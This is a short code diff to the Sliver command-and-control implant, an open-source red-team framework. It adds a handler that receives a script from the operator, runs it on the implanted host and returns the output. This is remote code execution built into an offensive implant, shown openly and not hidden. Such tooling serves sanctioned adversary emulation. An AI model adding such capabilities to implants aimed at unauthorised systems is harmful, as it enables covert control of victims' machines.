@@ -39,6 +39,7 @@ import (
 	pb "github.com/bishopfox/sliver/protobuf/sliver"
 	"github.com/bishopfox/sliver/sliver/procdump"
 	"github.com/bishopfox/sliver/sliver/ps"
+	"github.com/bishopfox/sliver/sliver/scripting"
 	"github.com/bishopfox/sliver/sliver/taskrunner"
 
 	"github.com/golang/protobuf/proto"
@@ -450,6 +451,29 @@ func executeHandler(data []byte, resp RPCResponse) {
 	}
 	data, err = proto.Marshal(execResp)
 	resp(data, err)
+}
+
+func runScriptHandler(req []byte, resp RPCResponse) {
+	runScriptReq := &pb.RunScriptReq{}
+	err := proto.Unmarshal(req, runScriptReq)
+	if err != nil {
+		//{{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		//{{end}}
+		return
+	}
+	output, err := scripting.RunScript(runScriptReq.Data)
+	var errStr string
+	if err != nil {
+		errStr = err.Error()
+	}
+	runScriptResp := &pb.RunScript{
+		Result: output,
+		Error:  errStr,
+	}
+	data, err := proto.Marshal(runScriptResp)
+	resp(data, err)
+
 }
 
 // ---------------- Data Encoders ----------------
